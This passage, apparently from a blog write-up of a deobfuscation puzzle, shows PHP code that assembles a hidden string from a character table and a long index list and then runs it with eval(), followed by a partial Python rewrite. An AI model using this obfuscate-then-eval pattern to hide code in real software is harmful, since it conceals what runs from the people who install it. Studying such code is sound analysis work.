class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">47</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="nv">$do_me</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$order</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">	<span class="nv">$do_me</span><span class="o">=</span><span class="nv">$do_me</span><span class="o">.</span><span class="nv">$terms</span><span class="p">[</span><span class="nv">$order</span><span class="p">[</span><span class="nv">$i</span><span class="p">]];</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="k">eval</span><span class="p">(</span><span class="nv">$do_me</span><span class="p">);</span>
</span><span class="line"><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Find an online tool to run this PHP code or re-write it in Python . My Python code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Code re-written in Python </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">terms</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;M&quot;</span><span class="p">,</span> <span class="s">&quot;Z&quot;</span><span class="p">,</span> <span class="s">&quot;]&quot;</span><span class="p">,</span> <span class="s">&quot;p&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">,</span> <span class="s">&quot;f&quot;</span><span class="p">,</span> <span class="s">&quot;1&quot;</span><span class="p">,</span> <span class="s">&quot;v&quot;</span><span class="p">,</span> <span class="s">&quot;&lt;&quot;</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">,</span> <span class="s">&quot;Q&quot;</span><span class="p">,</span> <span class="s">&quot;z&quot;</span><span class="p">,</span> <span class="s">&quot; &quot;</span><span class="p">,</span> <span class="s">&quot;s&quot;</span><span class="p">,</span> <span class="s">&quot;m&quot;</span><span class="p">,</span> <span class="s">&quot;+&quot;</span><span class="p">,</span> <span class="s">&quot;E&quot;</span><span class="p">,</span> <span class="s">&quot;D&quot;</span><span class="p">,</span> <span class="s">&quot;g&quot;</span><span class="p">,</span> <span class="s">&quot;W&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;q&quot;</span><span class="p">,</span> <span class="s">&quot;y&quot;</span><span class="p">,</span> <span class="s">&quot;T&quot;</span><span class="p">,</span> <span class="s">&quot;V&quot;</span><span class="p">,</span> <span class="s">&quot;n&quot;</span><span class="p">,</span> <span class="s">&quot;S&quot;</span><span class="p">,</span> <span class="s">&quot;X&quot;</span><span class="p">,</span> <span class="s">&quot;)&quot;</span><span class="p">,</span> <span class="s">&quot;9&quot;</span><span class="p">,</span> <span class="s">&quot;C&quot;</span><span class="p">,</span> <span class="s">&quot;P&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">,</span> <span class="s">&quot;&amp;&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\&#39;</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;!&quot;</span><span class="p">,</span> <span class="s">&quot;x&quot;</span><span class="p">,</span> <span class="s">&quot;G&quot;</span><span class="p">,</span> <span class="s">&quot;:&quot;</span><span class="p">,</span> <span class="s">&quot;2&quot;</span><span class="p">,</span> <span class="s">&quot;~&quot;</span><span class="p">,</span> <span class="s">&quot;O&quot;</span><span class="p">,</span> <span class="s">&quot;h&quot;</span><span class="p">,</span> <span class="s">&quot;u&quot;</span><span class="p">,</span> <span class="s">&quot;U&quot;</span><span class="p">,</span> <span class="s">&quot;@&quot;</span><span class="p">,</span> <span class="s">&quot;;&quot;</span><span class="p">,</span> <span class="s">&quot;H&quot;</span><span class="p">,</span> <span class="s">&quot;3&quot;</span><span class="p">,</span> <span class="s">&quot;F&quot;</span><span class="p">,</span> <span class="s">&quot;6&quot;</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">,</span> <span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="s">&quot;&gt;&quot;</span><span class="p">,</span> <span class="s">&quot;^&quot;</span><span class="p">,</span> <span class="s">&quot;,&quot;</span><span class="p">,</span> <span class="s">&quot;.&quot;</span><span class="p">,</span> <span class="s">&quot;l&quot;</span><span class="p">,</span> <span class="s">&quot;$&quot;</span><span class="p">,</span> <span class="s">&quot;d&quot;</span><span class="p">,</span> <span class="s">&quot;`&quot;</span><span class="p">,</span> <span class="s">&quot;%&quot;</span><span class="p">,</span> <span class="s">&quot;N&quot;</span><span class="p">,</span> <span class="s">&quot;*&quot;</span><span class="p">,</span> <span class="s">&quot;[&quot;</span><span class="p">,</span> <span class="s">&quot;0&quot;</span><span class="p">,</span> <span class="s">&quot;}&quot;</span><span class="p">,</span> <span class="s">&quot;J&quot;</span><span class="p">,</span> <span class="s">&quot;-&quot;</span><span class="p">,</span> <span class="s">&quot;5&quot;</span><span class="p">,</span> <span class="s">&quot;_&quot;</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="p">,</span> <span class="s">&quot;=&quot;</span><span class="p">,</span> <span class="s">&quot;{&quot;</span><span class="p">,</span> <span class="s">&quot;k&quot;</span><span class="p">,</span> <span class="s">&quot;o&quot;</span><span class="p">,</span> <span class="s">&quot;7&quot;</span><span class="p">,</span> <span class="s">&quot;#&quot;</span><span class="p">,</span> <span class="s">&quot;i&quot;</span><span class="p">,</span> <span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="s">&quot;Y&quot;</span><span class="p">,</span> <span class="s">&quot;(&quot;</span><span class="p">,</span> <span class="s">&quot;j&quot;</span><span class="p">,</span> <span class="s">&quot;/&quot;</span><span class="p">,</span> <span class="s">&quot;?&quot;</span><span class="p">,</span> <span class="s">&quot;K&quot;</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">,</span> <span class="s">&quot;B&quot;</span><span class="p">,</span> <span class="s">&quot;t&quot;</span><span class="p">,</span> <span class="s">&quot;R&quot;</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">,</span> <span class="s">&quot;8&quot;</span><span class="p">,</span> <span class="s">&quot;e&quot;</span><span class="p">,</span> <span class="s">&quot;|&quot;</span><span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">order</span><span class="o">=</span> <span class="p">[</span><span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span 